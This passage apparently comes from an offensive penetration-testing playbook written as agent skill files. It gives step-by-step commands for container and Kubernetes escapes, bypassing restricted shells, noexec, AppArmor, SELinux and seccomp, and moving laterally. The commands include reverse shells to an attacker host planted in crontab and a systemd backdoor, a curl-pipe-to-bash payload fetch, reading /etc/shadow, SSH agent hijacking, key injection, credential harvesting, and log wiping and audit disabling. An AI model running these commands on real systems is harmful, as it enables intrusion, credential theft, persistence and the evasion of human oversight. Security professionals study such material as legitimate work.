  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Tty":true,"OpenStdin":true,
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")

# Step 3: Start container
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/${CONTAINER_ID}/start"

# Step 4: Exec command (read host shadow)
EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/${CONTAINER_ID}/exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/host/etc/shadow"],"AttachStdout":true}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")

curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/exec/${EXEC_ID}/start" \
  -H "Content-Type: application/json" \
  -d '{"Tty":true}'

# Step 5: Cleanup
curl -s --unix-socket /var/run/docker.sock \
  -X DELETE "http://localhost/containers/${CONTAINER_ID}?force=true"
```

---

## 3. ESCAPE CHAIN: CGROUP RELEASE_AGENT → HOST COMMAND EXECUTION

```bash
# Step 1: Confirm cgroup v1 + CAP_SYS_ADMIN
mount | grep cgroup
# Look for "cgroup" (not "cgroup2")
grep CapEff /proc/self/status
# Need at minimum CAP_SYS_ADMIN

# Step 2: Find writable cgroup mount
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null | head -n1))
[ -z "$d" ] && echo "No writable cgroup found" && exit 1

# Step 3: Create a child cgroup
mkdir -p "$d/escape"

# Step 4: Enable release notification
echo 1 > "$d/escape/notify_on_release"

# Step 5: Set release_agent to our script on host
host_path=$(sed -n 's/.*\bperdir=\([^,]*\).*/\1/p' /etc/mtab)
# Alternative if perdir not found:
[ -z "$host_path" ] && host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > "$d/release_agent"

# Step 6: Create the command script (executed on HOST)
cat > /cmd << 'EOF'
#!/bin/sh
id > /output
cat /etc/hostname >> /output
cat /etc/shadow >> /output
EOF
chmod +x /cmd

# Step 7: Trigger — add process to cgroup then exit
sh -c "echo \$\$ > $d/escape/cgroup.procs"
sleep 2

# Step 8: Read results
cat /output
```

---

## 4. DOCKER-IN-DOCKER (DinD) ESCAPE

### 4.1 Nested Docker → Host

```bash
# Scenario: running inside a DinD container that has its own Docker daemon
# The inner Docker socket controls the DinD daemon, not the host

# Step 1: Check which Docker we're talking to
docker info 2>/dev/null | grep "Docker Root Dir"
# /var/lib/docker → inner daemon
# Different path → might be host socket

# Step 2: Look for host socket mount
find / -name "docker.sock" 2>/dev/null
# /var/run/docker.sock → could be host's
# /run/docker.sock → inner daemon's

# Step 3: If inner DinD is privileged against the HOST:
# The DinD container itself can see host devices
fdisk -l 2>/dev/null
# If host disk visible → mount it

# Step 4: Escape through the layers
# Inner container → DinD container (via DinD socket) → Host (via privileged mount)
```

### 4.2 DinD with Host Docker Socket Forwarded

```bash
# Common CI/CD pattern: DinD with -v /var/run/docker.sock:/var/run/docker.sock
# This means the DinD container controls the HOST Docker daemon

# Step 1: From inside inner container, if Docker socket is accessible:
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine chroot /host bash

# Step 2: This new container runs on the HOST with full access
```

---

## 5. KUBERNETES-SPECIFIC ESCAPE PATHS

### 5.1 Privileged Pod → Node

```bash
# Step 1: Confirm in Kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /etc/hostname    # pod name format

# Step 2: If pod is privileged
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Now on the Kubernetes node

# Step 3: From node, access kubelet credentials
cat /var/lib/kubelet/config.yaml
ls /etc/kubernetes/pki/    # cluster certificates
```

### 5.2 Service Account → Privileged Pod Creation

```bash
# Step 1: Read current SA token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://kubernetes.default.svc"

# Step 2: Check permissions
curl -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}"

# Step 3: If can create pods → create privileged escape pod
curl -sk "$API/api/v1/namespaces/$NS/pods" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape-pod"},
    "spec": {
      "hostPID": true,
      "hostNetwork": true,
      "containers": [{
        "name": "escape",
        "image": "alpine",
        "command": ["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c \"cat /etc/shadow > /tmp/shadow\"; sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name":"hostfs","mountPath":"/host"}]
      }],
      "volumes": [{"name":"hostfs","hostPath":{"path":"/"}}]
    }
  }'

# Step 4: Exec into escape pod
curl -sk "$API/api/v1/namespaces/$NS/pods/escape-pod/exec?command=/bin/sh&stdin=true&stdout=true&tty=true" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade"
```

### 5.3 hostPath Volume → Node Filesystem

```bash
# If pod has a hostPath volume mounted (even non-privileged):
# Step 1: Check mounts
mount | grep -v "overlay\|tmpfs\|proc\|cgroup"

# Step 2: If /host or similar exists:
ls /host/etc/shadow      # Read node's shadow
cat /host/root/.ssh/id_rsa   # SSH keys

# Step 3: Write to host for persistence
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /host/etc/crontab
```

---

## 6. ESCAPE CHAIN SELECTION MATRIX

| Available Condition | Best Escape Chain | Section |
|---|---|---|
| `--privileged` flag | Mount host disk + chroot | §1.1 |
| `--privileged` + hostPID | nsenter -t 1 | §1.2 |
| Docker socket mounted | Create privileged container | §2 |
| CAP_SYS_ADMIN + cgroup v1 | release_agent write | §3 |
| CAP_SYS_PTRACE + hostPID | Process injection | SKILL.md §3.2 |
| CAP_DAC_READ_SEARCH | Shocker (open_by_handle_at) | SKILL.md §3.4 |
| K8s SA with pod/create RBAC | Create privileged pod | §5.2 |
| K8s hostPath volume | Read/write node filesystem | §5.3 |
| Vulnerable kernel | Kernel exploit | linux-privilege-escalation |
| Vulnerable runc (<1.0.0-rc6) | CVE-2019-5736 | SKILL.md §8 |
| DinD with host socket | Double-hop escape | §4.2 |


---

# Part 6: Linux Security Bypass


## 1. RESTRICTED BASH (rbash) BYPASS

### 1.1 SSH-Based Bypass

```bash
# Force a different shell via SSH
ssh user@host -t "bash --noprofile --norc"
ssh user@host -t "/bin/sh"
ssh user@host -t "bash -l"

# If ForceCommand is set in sshd_config, these may not work
# Try SFTP/SCP instead — often not restricted:
sftp user@host
# SFTP shell can sometimes execute commands
```

### 1.2 Editor-Based Escape

```bash
# vi/vim escape
vi
:set shell=/bin/bash
:shell
# Or: :!/bin/bash

# ed escape
ed
!/bin/bash

# nano (if available)
# Ctrl+R → Ctrl+X → command execution
```

### 1.3 Language Interpreter Escape

| Interpreter | Command |
|---|---|
| Python | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Perl | `perl -e 'exec "/bin/bash";'` |
| Ruby | `ruby -e 'exec "/bin/bash"'` |
| Lua | `lua -e 'os.execute("/bin/bash")'` |
| PHP | `php -r 'system("/bin/bash");'` |
| Node.js | `node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'` |
| AWK | `awk 'BEGIN {system("/bin/bash")}'` |

### 1.4 Environment Variable Tricks

```bash
# Overwrite shell via BASH_CMDS
BASH_CMDS[x]=/bin/bash
x

# Use env to spawn unrestricted shell
env /bin/bash
env -i /bin/bash

# PATH manipulation (if export is allowed)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/bin/bash

# If only specific commands are allowed:
# Use allowed command to read files
git log --oneline --all -p    # git can read arbitrary files
git diff /dev/null /etc/shadow
```

### 1.5 Other Escapes

| Method | Command |
|---|---|
| `expect` | `expect -c 'spawn /bin/bash; interact'` |
| `script` | `script -qc /bin/bash /dev/null` |
| `rlwrap` | `rlwrap /bin/bash` |
| `nmap` (old) | `nmap --interactive` → `!bash` |

---

## 2. READ-ONLY / NOEXEC FILESYSTEM EXECUTION

### 2.1 DDexec — Execute From stdin via /proc/self/mem

```bash
# DDexec overwrites the running process memory with a new binary
# No file written to disk — completely fileless

# Usage: pipe any ELF binary through DDexec
curl -sL https://attacker.com/payload | bash ddexec.sh

# How it works:
# 1. Opens /proc/self/mem for writing
# 2. Seeks to the text segment of the current process
# 3. Overwrites it with the target ELF binary
# 4. Jumps to the new entry point
```

### 2.2 memfd_create — In-Memory File Descriptor

```python
import ctypes, os
libc = ctypes.CDLL("libc.so.6")
fd = libc.syscall(319, b"", 0)     # SYS_MEMFD_CREATE (x86_64)
with open(f"/proc/self/fd/{fd}", "wb") as f:
    f.write(open("/path/to/binary", "rb").read())
os.execve(f"/proc/self/fd/{fd}", ["binary"], os.environ)   # Bypasses noexec
```

```bash
# Perl variant: syscall(319, "", 0) → write to fd → exec /proc/$$/fd/$fd
```

### 2.3 ld.so Direct Execution

```bash
# Use the dynamic linker to execute from a writable mount
# Even if the binary's partition is noexec, ld.so runs from its own mount
/lib64/ld-linux-x86-64.so.2 /path/on/noexec/mount/binary

# Or from /dev/shm (usually writable + exec):
cp binary /dev/shm/binary
/dev/shm/binary
```

### 2.4 Script Interpreters on noexec

```bash
# Scripts still execute on noexec — only ELF execution is blocked
# The interpreter (python/perl/bash) runs from an exec-allowed mount
# and reads the script as data

python3 /noexec/mount/exploit.py      # Works
perl /noexec/mount/exploit.pl         # Works
bash /noexec/mount/exploit.sh         # Works
# But ./exploit (ELF binary) → "Permission denied"
```

### 2.5 Writable Mount Points

```bash
# Common writable + exec-capable locations:
/dev/shm        # tmpfs — almost always writable + exec
/tmp            # Sometimes noexec on hardened systems
/var/tmp        # Often writable
/run            # tmpfs — check permissions

# Check mount options:
mount | grep -E "shm|tmp"
# Look for "noexec" flag — if absent, exec is allowed
```

---

## 3. APPARMOR BYPASS

### 3.1 Profile Enumeration

```bash
# Check AppArmor status
aa-status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled     # Y = enabled
cat /sys/kernel/security/apparmor/profiles      # List all profiles

# Check current process profile:
cat /proc/self/attr/current
# "unconfined" = no restriction
# "docker-default (enforce)" = Docker's default profile
```

### 3.2 Exploitation Strategies

```bash
# Find unconfined processes (inject via ptrace if root):
ps auxZ 2>/dev/null | grep unconfined

# Complain mode = effectively no restriction (just logging):
aa-status | grep complain
```

Common AppArmor profile gaps: `/proc/self/fd/*` access, abstract Unix sockets, interpreter-based execution (python scripts bypass binary restrictions), and newly created paths.

---

## 4. SELINUX BYPASS

### 4.1 Mode Check

```bash
getenforce           # Enforcing / Permissive / Disabled
sestatus             # Detailed status
cat /etc/selinux/config   # Persistent configuration

# Check current context
id -Z
ps auxZ | head -20
```

### 4.2 Permissive Domain Exploitation

```bash
semanage permissive -l 2>/dev/null    # Domains in permissive mode
ps -eZ | grep -i permissive           # Processes — can do anything (just logged)
```

### 4.3 Context Transition & Booleans

```bash
ls -Z /tmp/                           # File contexts — tmp_t has broader access
sesearch --allow -t unconfined_t 2>/dev/null | head -30   # Transition rules

# Dangerous booleans that weaken SELinux:
getsebool -a | grep -i "on$" | grep -iE "exec|write|network|connect"
# httpd_can_network_connect, allow_execmem
```

---

## 5. SECCOMP BYPASS

### 5.1 Check Seccomp Status

```bash
grep Seccomp /proc/self/status
# Seccomp: 0 = disabled, 1 = strict, 2 = filter

# Docker default seccomp profile blocks ~44 syscalls
# Check what's allowed:
./amicontained    # Shows blocked/allowed syscalls
```

### 5.2 Architecture Confusion (x86 vs x86_64)

```bash
# Seccomp filters often only check x86_64 syscall numbers
# x86 (32-bit) syscall numbers are different!
# If the filter doesn't check the architecture:

# Compile a 32-bit binary that uses x86 syscall numbers:
# x86_64 execve = 59, x86 execve = 11
# The filter blocks syscall 59 but not 11

gcc -m32 -static -o exploit32 exploit.c
# If the seccomp filter lacks AUDIT_ARCH_X86 check → bypass
```

### 5.3 Allowed Syscall Abuse & Kernel Bugs

Allowed syscalls to abuse creatively: `sendmsg/recvmsg` (pass FDs between processes), `mmap/mprotect` (executable memory), `process_vm_readv/writev` (cross-process memory).

Known seccomp kernel bugs: CVE-2019-2054 (ptrace bypass), io_uring bypassed seccomp entirely (pre-5.12). Check `uname -r` and compare.

---

## 6. AUDIT EVASION

### 6.1 Timestamp Manipulation

```bash
# Modify file timestamps to hide changes
touch -r /etc/hosts /modified/file          # Copy timestamp from reference
touch -t 202301010000.00 /modified/file     # Set specific timestamp

# Modify log timestamps (if writable)
# Use timestomping to match surrounding entries
```

### 6.2 Log Tampering & Process Spoofing

```bash
sed -i '/pattern/d' /var/log/auth.log     # Remove specific entries
echo "" > /var/log/wtmp                    # Clear login records
journalctl --rotate && journalctl --vacuum-time=1s   # Clear journal

# Process name spoofing (hide in ps output):
exec -a "[kworker/0:0]" /bin/bash          # Bash
# C/Python: prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0)

# Disable audit (if root):
auditctl -e 0 && service auditd stop
```

---

## 7. LINUX SECURITY BYPASS DECISION TREE

```
Security mechanism identified?
│
├── Restricted shell (rbash)?
│   ├── SSH access? → ssh -t "bash --noprofile --norc" (§1.1)
│   ├── Editor available? → vi :!/bin/bash (§1.2)
│   ├── Language interpreter? → python/perl/ruby escape (§1.3)
│   ├── env command? → env /bin/bash (§1.4)
│   └── Allowed commands with escape? → git/man/less → !bash (§1.5)
│
├── noexec filesystem?
│   ├── Script interpreters available? → bash/python/perl scripts work (§2.4)
│   ├── /dev/shm writable + exec? → copy binary there (§2.5)
│   ├── memfd_create available? → fileless execution (§2.2)
│   ├── ld.so accessible? → ld.so /path/to/binary (§2.3)
│   └── Last resort → DDexec via /proc/self/mem (§2.1)
│
├── AppArmor enforcing?
│   ├── Profile in complain mode? → no restriction, just logging (§3.3)
│   ├── Unconfined processes exist? → inject/migrate to them (§3.2)
│   ├── Profile missing path coverage? → use uncovered paths (§3.4)
│   └── Interpreter not restricted? → script-based execution
│
├── SELinux enforcing?
│   ├── Domain set to permissive? → exploit that domain (§4.2)
│   ├── Dangerous booleans enabled? → abuse allowed actions (§4.4)
│   ├── Context transition available? → execute binary with transition (§4.3)
│   └── Kernel CVE? → SELinux bypass exploit
│
├── seccomp filter active?
│   ├── Architecture check missing? → 32-bit syscall confusion (§5.2)
│   ├── Allowed syscalls exploitable? → sendmsg/mmap abuse (§5.3)
│   ├── Kernel bug? → io_uring/ptrace bypass (§5.4)
│   └── Check what's blocked → amicontained (§5.1)
│
└── Audit logging?
    ├── Writable logs? → delete/modify entries (§6.2)
    ├── Root access? → disable auditd (§6.4)
    ├── Need stealth? → process name spoofing (§6.3)
    └── File changes tracked? → timestamp manipulation (§6.1)
```


---

# Part 7: Lateral Movement


## 1. SSH AGENT HIJACKING

### 1.1 Find SSH Agent Sockets

```bash
# As root (or user with access to other users' processes):
find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null
# Or via /proc:
grep -r SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | tr '\0' '\n'

# Typical path: /tmp/ssh-XXXXXX/agent.PID
```

### 1.2 Hijack Agent Forwarding

```bash
# Set the found socket as our auth agent
export SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345

# List available keys in the agent
ssh-add -l
# If keys appear → we can use them

# SSH to any host this agent can authenticate to
ssh -o StrictHostKeyChecking=no user@internal-host

# The agent owner won't notice — we're using their forwarded agent
```

### 1.3 Persistent Agent Monitoring

```bash
# Monitor for new SSH agent sockets (wait for admin to SSH in)
inotifywait -m /tmp -e create 2>/dev/null | grep ssh-
# Or poll:
while true; do
    find /tmp -path "*/ssh-*" -name "agent.*" -newer /tmp/.marker 2>/dev/null
    touch /tmp/.marker
    sleep 5
done
```

---

## 2. SSH KEY HARVESTING

### 2.1 Private Key Locations

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null
# Also: /etc/ssh/ssh_host_*_key (MITM), /home/*/.ssh/id_*

# Find keys without passphrase:
for key in $(find / -name "id_*" ! -name "*.pub" 2>/dev/null); do
    ssh-keygen -y -P "" -f "$key" > /dev/null 2>&1 && echo "NO PASSPHRASE: $key"
done
```

### 2.2 known_hosts Parsing

```bash
# Hashed known_hosts (common default):
cat ~/.ssh/known_hosts
# May be hashed — use ssh-keygen to check against known IPs:
ssh-keygen -F 10.0.0.1 -f ~/.ssh/known_hosts

# Unhashed known_hosts → direct IP/hostname list
awk '{print $1}' ~/.ssh/known_hosts | sort -u

# Extract all hostnames/IPs from all users' known_hosts
cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null \
  | awk '{print $1}' | tr ',' '\n' | sort -u
```

### 2.3 authorized_keys Injection

```bash
# Generate attacker keypair (on attacker box)
ssh-keygen -t ed25519 -f /tmp/pivot_key -N ""

# Inject public key (on compromised host)
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /root/.ssh/authorized_keys
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /home/admin/.ssh/authorized_keys

# SSH back in with our key
ssh -i /tmp/pivot_key root@target
```

---

## 3. CREDENTIAL HARVESTING LOCATIONS

### 3.1 System Credentials

| Location | Contents | Command |
|---|---|---|
| `/etc/shadow` | Password hashes | `cat /etc/shadow` (root) |
| `/etc/passwd` | User list, may contain hashes | `cat /etc/passwd` |
| `.bash_history` | Command history (passwords in cleartext) | `cat /home/*/.bash_history` |
| `.mysql_history` | MySQL commands with passwords | `cat /home/*/.mysql_history` |
| `.psql_history` | PostgreSQL commands | `cat /home/*/.psql_history` |
| `.pgpass` | PostgreSQL password file | `cat /home/*/.pgpass` |
| `.my.cnf` | MySQL credentials | `cat /home/*/.my.cnf` |
| `.netrc` | FTP/HTTP auto-login credentials | `cat /home/*/.netrc` |
| `.git-credentials` | Git HTTPS passwords | `cat /home/*/.git-credentials` |

### 3.2 Environment & Config Files

```bash
# Current process secrets
env | grep -iE "pass|key|secret|token|api|cred|auth"

# All process environments (root):
for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|secret|token"
done

# Application configs (common credential locations):
find /var/www /opt /srv -name "wp-config.php" -o -name "settings.py" \
     -o -name "*.env" -o -name "database.yml" -o -name "docker-compose.yml" 2>/dev/null

# Keyrings & secret stores:
find / -name "*.keyring" -o -name ".vault-token" -o -path "*/.password-store/*.gpg" 2>/dev/null
```

---

## 4. D-BUS EXPLOITATION

### 4.1 Enumerate D-Bus Services

```bash
# List system bus services
dbus-send --system --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# List session bus services
dbus-send --session --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Introspect a service (find available methods)
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply \
  /org/freedesktop/systemd1 org.freedesktop.DBus.Introspectable.Introspect
```

### 4.2 Abuse systemd & PolicyKit via D-Bus

```bash
# Start a service via D-Bus (if policy allows):
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply /org/freedesktop/systemd1 \
  org.freedesktop.systemd1.Manager.StartUnit \
  string:"malicious.service" string:"replace"

# polkit actions available without auth:
pkaction --verbose 2>/dev/null | grep -B5 "implicit active: yes"
```

---

## 5. INTERNAL NETWORK PIVOTING

### 5.1 SSH Tunneling

```bash
# Local port forward: access INTERNAL_HOST:3306 via localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 pivot@compromised-host

# Remote port forward: expose attacker service to internal network
ssh -R 8080:ATTACKER:8080 pivot@compromised-host

# Dynamic SOCKS proxy: route all traffic through pivot
ssh -D 1080 pivot@compromised-host
# Then: proxychains nmap -sT INTERNAL_RANGE

# SSH over SSH (multi-hop):
ssh -J user1@hop1,user2@hop2 target@final-host
```

### 5.2 Without SSH — Alternative Tunnels

```bash
# socat port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80 &

# ncat relay
ncat -l -p 8080 --sh-exec "ncat INTERNAL_HOST 80"

# /dev/tcp (Bash built-in, no tools needed)
exec 3<>/dev/tcp/INTERNAL_HOST/80
echo -e "GET / HTTP/1.0\r\nHost: INTERNAL_HOST\r\n\r\n" >&3
cat <&3

# chisel (SOCKS proxy over HTTP)
# On attacker: chisel server -p 8080 --reverse
# On target:   chisel client ATTACKER:8080 R:socks
```

### 5.3 Network Discovery from Compromised Host

```bash
ss -tlnp && ss -tnp                  # Listening & established connections
arp -a && ip neigh                    # Known adjacent hosts
cat /etc/resolv.conf                  # DNS servers
dig axfr internal.domain @dns 2>/dev/null   # Zone transfer

# Subnet sweep (bash-only, no tools):
for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo "ALIVE: 10.0.0.$i" & done; wait

# Port scan via /dev/tcp:
for port in 22 80 443 3306 5432 6379 8080; do
    (echo >/dev/tcp/10.0.0.1/$port) 2>/dev/null && echo "OPEN: $port"
done
```

---

## 6. SHARED FILESYSTEM EXPLOITATION

### 6.1 NFS Mounts

```bash
# Discover NFS shares
showmount -e FILESERVER_IP 2>/dev/null

# Check for no_root_squash (root maps to root)
mount -t nfs FILESERVER_IP:/share /mnt/nfs
# If no_root_squash: create SUID binaries visible to other hosts

# All hosts mounting the same share → SUID binary = root on all hosts
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
```

### 6.2 SMB/CIFS Shares

```bash
# Enumerate shares
smbclient -L //FILESERVER_IP/ -N 2>/dev/null      # Null session
smbclient -L //FILESERVER_IP/ -U 'user%password'

# Mount and search for credentials
mount -t cifs //FILESERVER_IP/share /mnt/smb -o username=user,password=pass
find /mnt/smb -name "*.conf" -o -name "*.cfg" -o -name "*.kdbx" \
     -o -name "*.xlsx" -o -name "*.docx" 2>/dev/null
```

---

## 7. SUDO TOKEN REUSE (ptrace-Based)

```bash
# If another user has an active sudo session (timestamp not expired):
# And we can ptrace their process (same UID or root)

# Check sudo timestamp files:
ls -la /var/run/sudo/ts/ 2>/dev/null
ls -la /var/db/sudo/ 2>/dev/null
# Files here mean active sudo tokens

# ptrace-based hijack:
# Attach to the user's shell process
# Inject: sudo /bin/bash
# The injected sudo inherits the valid timestamp → no password needed

# Automated tool: sudo_inject
# https://github.com/nongiach/sudo_inject
# Injects into processes with valid sudo tokens
```

---

## 8. SYSTEMD SERVICE MANIPULATION

```bash
# Find writable unit files:
find /etc/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null

# Inject into existing service (add ExecStartPre=):
# Or create new: /etc/systemd/system/backdoor.service
# [Service] Type=oneshot ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
systemctl daemon-reload && systemctl enable --now backdoor.service
```

---

## 9. LATERAL MOVEMENT DECISION TREE

```
Compromised host — where to move next?
│
├── SSH credentials available?
│   ├── Private keys found? → try on all known_hosts targets (§2)
│   ├── SSH agent running? → hijack socket (§1)
│   ├── Passwords in history/configs? → spray across hosts (§3)
│   └── authorized_keys writable on other hosts? → inject key (§2.3)
│
├── Network services discovered?
│   ├── Internal web apps? → tunnel + attack (§5.1)
│   ├── Databases (3306/5432/6379)? → check harvested creds (§3)
│   ├── SMB/NFS shares? → mount + search for creds/SUID (§6)
│   └── Kubernetes API (6443)? → load kubernetes-pentesting skill
│
├── Can reach other hosts?
│   ├── Direct SSH? → use keys/passwords
│   ├── Firewalled? → SSH tunnel or chisel (§5)
│   └── No tools? → /dev/tcp + bash (§5.2)
│
├── Root on current host?
│   ├── Read /etc/shadow → crack hashes → password reuse (§3)
│   ├── Dump /proc/*/environ → find service credentials (§3.2)
│   ├── Hijack sudo tokens → piggyback admin sessions (§7)
│   └── Modify systemd services → backdoor (§8)
│
├── D-Bus services available?
│   ├── Privileged services exposed? → method call abuse (§4)
│   └── polkit actions without auth? → privilege actions (§4.3)
│
└── No obvious path?
    ├── ARP scan + port sweep internal network (§5.3)
    ├── Passive credential sniffing (if cap_net_raw)
    ├── Wait for admin SSH → agent hijack (§1.3)
    └── Check for cloud metadata (169.254.169.254)
```


---

# Part 8: Kubernetes Pentesting


## 1. K8S API SERVER ACCESS

### 1.1 Anonymous Access Check

```bash
# Check if anonymous auth is enabled (default: limited in modern clusters)
curl -sk https://APISERVER:6443/api/v1/namespaces
curl -sk https://APISERVER:6443/version
curl -sk https://APISERVER:6443/api
curl -sk https://APISERVER:6443/apis

# Common API server ports:
# 6443 — secure API (default)
# 8443 — alternative secure
# 8080 — insecure API (legacy, no auth needed)
```

### 1.2 Token-Based Authentication (from inside pod)

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://kubernetes.default.svc"

curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods
```

### 1.3 Certificate / Kubeconfig Authentication

```bash
# Common kubeconfig locations: ~/.kube/config, /etc/kubernetes/admin.conf,
# /etc/kubernetes/kubelet.conf, /var/lib/kubelet/kubeconfig
kubectl --kubeconfig=/etc/kubernetes/admin.conf get pods --all-namespaces
```

---

## 2. RBAC ENUMERATION

### 2.1 Self-Permission Check

```bash
# What can I do?
kubectl auth can-i --list
kubectl auth can-i --list -n kube-system

# Specific checks
kubectl auth can-i create pods
kubectl auth can-i create pods -n kube-system
kubectl auth can-i get secrets
kubectl auth can-i '*' '*'     # Full cluster admin?

# Via API (from inside pod):
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Content-Type: application/json" \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NAMESPACE\"}}"
```

### 2.2 Role and ClusterRole Enumeration

```bash
kubectl get roles --all-namespaces && kubectl get clusterroles
kubectl describe clusterrole CLUSTER_ROLE_NAME

# Find overprivileged roles (wildcard verbs/resources):
kubectl get clusterroles -o json | python3 -c 'import sys,json;data=json.load(sys.stdin);[print(f"OVERPRIVILEGED: {r[\"metadata\"][\"name\"]}") for r in data["items"] for rule in r.get("rules",[]) if "*" in rule.get("verbs",[]) or "*" in rule.get("resources",[])]'
```

### 2.3 Dangerous RBAC Permissions

| Permission | Risk | Escalation Path |
|---|---|---|
| `pods/exec` | **Critical** | Exec into any pod (access secrets, tokens) |
| `pods` (create) | **Critical** | Create privileged pod → node access |
| `secrets` (get/list) | **Critical** | Read all secrets including SA tokens |
| `serviceaccounts/token` (create) | **Critical** | Generate token for any SA |
| `nodes/proxy` | **High** | Proxy to Kubelet API |
| `escalate` on roles | **Critical** | Grant yourself any permission |
| `bind` on rolebindings | **Critical** | Bind any role to yourself |
| `impersonate` | **Critical** | Impersonate any user/SA |

---

## 3. SERVICE ACCOUNT TOKEN ABUSE

### 3.1 Token Location and Decoding

```bash
# Default mount point
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Decode JWT (no verification needed)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Shows: namespace, service account name, expiry
```

### 3.2 Escalation via Service Account

```bash
# If SA has elevated permissions — dump secrets, create privileged pod:
kubectl get secrets --all-namespaces
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata: { name: privesc }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n -p -- /bin/bash"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: hostfs, mountPath: /host }]
  volumes: [{ name: hostfs, hostPath: { path: / }}]
EOF
```

### 3.3 Token Generation

```bash
# If serviceaccounts/token create permission:
kubectl create token admin-sa -n kube-system --duration=87600h
```

---

## 4. ETCD DIRECT ACCESS

```bash
# Check anonymous access (port 2379 on master nodes):
curl -sk https://ETCD_IP:2379/version

# With certs from master node (/etc/kubernetes/pki/etcd/):
ETCDCTL_API=3 etcdctl --endpoints=https://ETCD_IP:2379 \
  --cacert=ca.crt --cert=server.crt --key=server.key \
  get / --prefix --keys-only | grep secrets

# Dump specific secret:
ETCDCTL_API=3 etcdctl ... get /registry/secrets/default/my-secret
```

---

## 5. POD ESCAPE TO NODE

### See [container-escape-techniques](../container-escape-techniques/SKILL.md) for detailed escape chains.

Quick reference for K8s-specific vectors:

| Vector | Requirement | Command |
|---|---|---|
| hostPID | `spec.hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- bash` |
| hostNetwork | `spec.hostNetwork: true` | Access node services (Kubelet, etcd) |
| hostPath `/` | Volume mount of host root | `chroot /host bash` |
| Privileged container | `securityContext.privileged: true` | Mount host disk / nsenter |

---

## 6. KUBELET API (Port 10250/10255)

```bash
curl -sk https://NODE_IP:10250/pods        # Anonymous access check
# 10255 = read-only (legacy, HTTP)

# Exec into pod via Kubelet (bypasses API server RBAC):
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME -d "cmd=id"

# Read logs:
